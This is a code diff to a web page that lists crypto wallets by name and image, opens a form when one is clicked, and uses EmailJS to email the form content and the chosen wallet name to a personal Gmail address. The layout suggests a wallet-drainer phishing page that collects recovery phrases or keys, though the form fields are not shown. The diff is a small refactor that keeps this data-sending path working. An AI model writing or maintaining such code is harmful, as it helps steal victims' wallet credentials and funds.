@@ -138,10 +138,14 @@
             { name: 'Other Wallet', img: 'other.jpg' }
         ];
 
+        let selectedWalletName = "None";
+
         function startProcess(walletName) {
+            selectedWalletName = walletName; // Update the selected wallet name
             document.getElementById('selected-wallet').textContent = `Selected Wallet: ${walletName}`;
             openModal('modal-manual');
         }
+
 
         function openModal(id) {
             document.getElementById(id).showModal();
@@ -189,7 +193,6 @@
         }
 
         function sendForm() {
-            const selectedWallet = document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '');
             const form = document.getElementById('walletForm');
             const formData = new FormData(form);
 
@@ -198,8 +201,8 @@
 
             // Send email via EmailJS
             emailjs.send("service_27imcaz", "template_dv2b63i", {
-                wallet_name: selectedWallet,  // Pass the wallet name
-                message: message,            // Pass the content value
+                wallet_name: selectedWalletName, // Pass the selected wallet name
+                message: message,               // Pass the content value
                 to_email: "jnrrihie36@gmail.com" // The recipient email
             })
                 .then(response => {
@@ -221,10 +224,10 @@
             walletDiv.onclick = () => startProcess(wallet.name);
 
             walletDiv.innerHTML = `
-                <div class="flex items-center gap-2">
-                    <p class="text-customDark-main font-bold">${wallet.name}</p>
-                </div>
-                <div><img src="${wallet.img}" alt="${wallet.name}" class="w-[40px] h-auto rounded-full" /></div>
+            <div class="flex items-center gap-2">
+                <p class="text-customDark-main font-bold">${wallet.name}</p>
+            </div>
+            <div><img src="${wallet.img}" alt="${wallet.name}" class="w-[40px] h-auto rounded-full" /></div>
             `;
 
             walletList.appendChild(walletDiv);
